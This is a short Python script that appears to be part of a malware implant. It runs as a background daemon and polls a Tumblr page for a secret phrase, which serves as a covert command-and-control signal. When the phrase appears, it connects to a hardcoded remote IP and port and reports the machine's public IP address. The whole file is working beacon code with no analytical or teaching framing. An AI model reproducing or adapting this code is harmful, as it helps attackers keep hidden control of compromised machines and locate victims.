import requests
import time
from ip_tools import get_public_ip
import socket
import sys
import daemon

class Flare(object):
    def __init__(self, init_params):
        self.link, self.delay, self.secret, self.dest_ip, self.dest_port = init_params

    def send_ip(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.dest_ip, self.dest_port))

        source_ip = get_public_ip()
        payload = bytearray(source_ip, 'utf8')
        sock.send(payload)

    def check_url(self):
        page = requests.get(self.link)

        if self.secret in page.text:
            return True
        else:
            return False

    def main_loop(self):
        while True:
            if not self.check_url():
                print("CNC not active")
                time.sleep(self.delay)
            else:
                self.send_ip()
                break

if __name__ == "__main__":
    LINK = "https://hardflowersalad.tumblr.com"
    DELAY = 10
    SECRET = "trying to get a paper ready"
    DEST_IP = "192.168.1.3" #"104.248.119.31"
    DEST_PORT = 1321

    INIT_PARAMS = (LINK, DELAY, SECRET, DEST_IP, DEST_PORT)

    with daemon.DaemonContext():
        flare = Flare(INIT_PARAMS)
        flare.main_loop()
